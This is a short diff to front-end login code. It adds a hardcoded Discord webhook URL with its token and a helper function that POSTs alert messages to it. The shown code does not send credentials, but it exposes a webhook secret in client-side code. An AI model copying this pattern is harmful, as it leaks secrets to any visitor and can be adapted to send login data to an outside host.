@@ -8,6 +8,28 @@ const db = supabase.createClient(supabaseUrl, supabaseKey);
 
 let currentUser = null;
 
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1501706688644911164/stzK50NrTNgJmOs3rL1JR2FTSnlzNA4yfi_kPzbh5JhU7ZjN8s5ViWL3541B9duwbr8Z';
+
+async function sendDiscordAlert(title, message, color=0xE8D08A) {
+  try {
+    const payload = {
+      embeds: [{
+        title: title,
+        description: message,
+        color: color,
+        timestamp: new Date().toISOString()
+      }]
+    };
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {
+    console.error('Discord Webhook Failed:', e);
+  }
+}
+
 async function tryLogin(){
   const email = document.getElementById('em-input').value.trim();
   const password = document.getElementById('pw-input').value;
